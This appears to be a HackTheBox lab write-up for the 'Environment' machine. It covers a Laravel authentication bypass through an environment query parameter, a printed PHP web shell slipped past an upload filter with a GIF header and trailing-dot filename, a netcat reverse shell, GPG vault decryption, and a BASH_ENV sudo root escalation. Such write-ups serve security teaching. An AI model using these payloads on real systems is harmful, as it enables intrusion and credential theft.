@@ -1,0 +1,92 @@
+Title: Environment
+Tag: HTB
+Date: 2025-01-01
+
+# Overview
+
+Environment was a Linux box built around a Laravel 11 web app. Sending an unexpected value type for the login form's "remember me" field triggered a verbose 500 error page that leaked PHP source code, revealing a hidden preprod environment switch that logs a request straight in as an existing user when the app's environment is set to "preprod", controllable simply by adding a query string parameter to the request. From there, the profile picture upload feature could be abused to plant a PHP web shell by disguising it as an image and appending a trailing dot to its filename to slip past extension filtering, giving code execution as the web service account. A GPG-encrypted password vault found in the user's home directory, decrypted using a private keyring that had also been left backed up on disk, contained a reused password that worked for SSH. A permissive, passwordless sudo rule for a custom systeminfo shell script then allowed root access through BASH_ENV environment variable injection.
+
+## Recon
+
+```
+> nmap -T4 -p- --min-rate 2000 10.10.11.67
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+> nmap -sC -sV -p22,80 10.10.11.67
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
+80/tcp open  http    nginx 1.22.1
+|_http-title: Did not follow redirect to http://environment.htb
+```
+
+Port 80 redirects to `environment.htb`. Nikto flagged the `XSRF-TOKEN` cookie as missing the `httponly` flag and noted a missing `X-Content-Type-Options` header. Directory brute forcing with feroxbuster turned up `/build/`, `/vendor/`, `/storage/`, `/storage/files/`, `/up`, `/upload`, and `/login`.
+
+## Application Enumeration
+
+The `/upload` endpoint rejected GET requests and identified the stack as PHP 8.2.28 running Laravel 11.30.0. Public Laravel RCE exploits (CVE-2024-52301 and related phpggc/monolog gadget chain exploits targeting Ignition) were tried, but the exploit script required access to `/vendor/`, which returned 403, apparently gated behind authentication. Reflected XSS was attempted through the login page's `error` query parameter (visible after a failed login) both manually and with wfuzz against an XSS wordlist, without success. Subdomain enumeration with ffuf against a common wordlist also produced nothing.
+
+## Source Code Disclosure via Error Page
+
+While testing the login form in Burp, sending `"remember": "False'"` (an unexpected value for a field the app expected as a proper boolean) triggered an unhandled 500 error that dumped PHP source code in the response. The leaked code showed the login handler's environment check:
+
+```php
+if(App::environment() == "preprod") { //QOL: login directly as me in dev/local/preprod envs
+    $request->session()->regenerate();
+    $request->session()->put('user_id', 1);
+    return redirect('/management/dashboard');
+}
+```
+
+This meant that if the application's environment could be influenced to report as `preprod`, the login flow would skip credential checking entirely and log the request in as user ID 1. Appending `?--env=preprod` to the POST request in Burp triggered this path successfully, logging in as `hish@environment.htb`.
+
+## Foothold - Web Shell via Profile Image Upload
+
+With an authenticated session, the profile image upload feature was targeted next. Uploading a PHP web shell directly was blocked by extension filtering on `.php`. Crafting the upload in Burp with an image `Content-Type` header, a GIF magic-number prefix, and an embedded PHP payload:
+
+```
+Content-Type: image/gif
+
+GIF87a
+<?php if(isset($_GET['cmd'])){system($_GET['cmd'].' 2>&1');} ?>
+```
+
+still didn't bypass the filter on its own, but appending a trailing dot to the uploaded filename (e.g. `wsh.php.`) did. The resulting shell was reachable at:
+
+```
+http://environment.htb/storage/files/wsh.php?cmd=whoami
+```
+
+Uploaded files were not persistent, a cleanup script removed them after roughly 5 to 10 minutes, so the shell had to be used promptly. An initial reverse shell attempt using `nc -e /bin/bash` connected but produced no output due to a shell redirection mistake; correcting it produced a working reverse shell, which was then upgraded to a full PTY with `python3 -c 'import pty; pty.spawn("/bin/bash")'`.
+
+## Credential Harvesting - GPG-Encrypted Vault
+
+Automated enumeration with linpeas didn't surface a clear privilege escalation path, but manual review of `/home/hish` found a `backup` directory alongside a separate `.gnupg` directory. Both were archived with `tar` and pulled off the box over a simple Python HTTP server. After restoring correct permissions on the recovered keyring (`700` on `.gnupg` and its `private-keys-v1.d` subdirectory, `600` on the key files themselves), `gpg --list-secret-keys` confirmed an importable RSA-2048 key, and `gpg --decrypt` against a `keyvault.gpg` file in the backup produced several stored credentials, including one explicitly labeled for `ENVIRONMENT.HTB`.
+
+## Lateral Movement - SSH as hish
+
+The password recovered from the decrypted vault for `ENVIRONMENT.HTB` worked directly over SSH for the `hish` account, granting access to the user flag.
+
+```
+> ssh hish@10.10.11.67
+```
+
+## Privilege Escalation - sudo systeminfo (BASH_ENV Injection)
+
+`sudo -l` showed that `hish` could run `/usr/bin/systeminfo` as root with no password required. Checking its man page showed it was implemented as a shell script rather than a compiled binary. Since bash scripts invoked this way source the file referenced by the `BASH_ENV` environment variable before running, setting that variable to a file containing `bash -p` and passing it through sudo caused it to execute as root before the intended script logic ran:
+
+```
+> echo "bash -p" > /tmp/rshell.sh
+> sudo BASH_ENV=/tmp/rshell.sh /usr/bin/systeminfo
+```
+
+This produced a root shell.
+
+## Takeaways
+
+- Sending an unexpected value type to a field a framework expects to be strictly boolean can trigger unhandled exceptions that dump full source code, including debug switches never meant to reach production.
+- Environment-based authentication bypasses left in code for developer convenience are dangerous the moment the app's reported environment can be influenced through an attacker-controlled request.
+- Extension-based upload filters that block a single exact extension can often be bypassed with trailing characters, such as a trailing dot, that get normalized away by the filesystem or framework after the check runs.
+- Local backups of sensitive material, including a user's own GPG keyring, sitting readable in a home directory can fully undermine the encryption meant to protect the data alongside it.
+- Recovered plaintext credentials are worth testing against every account and service on the box, not just the one they were originally associated with.
+- Passwordless sudo rules for custom shell scripts are vulnerable to BASH_ENV environment variable injection, since bash sources that file before running the target script whenever the script is invoked through bash rather than executed as a compiled binary.
